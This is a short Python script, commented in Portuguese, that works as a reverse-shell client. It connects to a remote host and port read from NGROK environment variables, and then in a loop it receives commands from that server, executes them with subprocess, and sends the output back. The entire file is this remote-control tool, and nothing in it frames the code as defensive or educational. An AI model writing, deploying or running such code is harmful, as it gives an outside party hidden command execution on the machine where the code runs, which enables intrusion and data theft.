import os
import socket
import subprocess


SERVER_HOST = os.getenv('NGROK_URL')
SERVER_PORT = os.getenv('NGROK_PORT')
BUFFER_SIZE = 1024

s = socket.socket()

s.connect((SERVER_HOST, SERVER_PORT))
message = s.recv(BUFFER_SIZE).decode()
print("Server: ", message)

while True:
    # Receber o comando
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        break
    # Executar o comando
    output = subprocess.getoutput(command)
    # Enviar o resultado
    s.send(output.encode())
# Fechar a conexão
s.close()
